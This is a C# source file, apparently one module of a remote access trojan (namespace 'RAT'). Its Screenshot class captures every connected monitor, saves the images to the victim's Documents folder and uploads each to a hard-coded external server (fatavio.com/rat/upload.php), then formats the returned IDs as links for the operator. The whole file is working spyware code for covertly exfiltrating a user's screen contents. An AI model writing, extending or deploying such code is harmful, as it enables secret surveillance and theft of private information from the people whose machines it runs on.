using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;

namespace RAT
{
    class Screenshot
    {
        public Screenshot()
        {
            if (Directory.Exists("screen")) Directory.Delete("screen");

            string appPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            for (int i = 0; i < Screen.AllScreens.Length; i++)
            {
                Screen screen = Screen.AllScreens[i];
                Bitmap bmpScreenshot = new Bitmap(screen.Bounds.Width, screen.Bounds.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screen.Bounds.Size, CopyPixelOperation.SourceCopy);
                bmpScreenshot.Save(appPath + "\\screen" + i.ToString() + ".png", ImageFormat.Png);
                _Screenshots.Add(appPath +  "\\screen" + i.ToString() + ".png");
            }
        }

        private List<string> _Screenshots = new List<string>();
        private List<string> _IDs = new List<string>();
        private string _BaseURL = "http://fatavio.com/rat/";

        public void Upload()
        {
            foreach (string screenshot in _Screenshots)
            {
                string id = Http.Upload(_BaseURL + "upload.php", screenshot);
                _IDs.Add(id);
            }
        }

        public string FormatResponse()
        {
            string r = ">>screenshot\n";
            foreach (string id in _IDs)
            {
                r += "#<#a href=\"screenshots/" + id + ".png\"#>#" + id + ".png#<#/a#>#\n";
            }
            return r + "\n";
        }

        public List<string> IDs
        {
            get { return _IDs; }
        }
    }
}
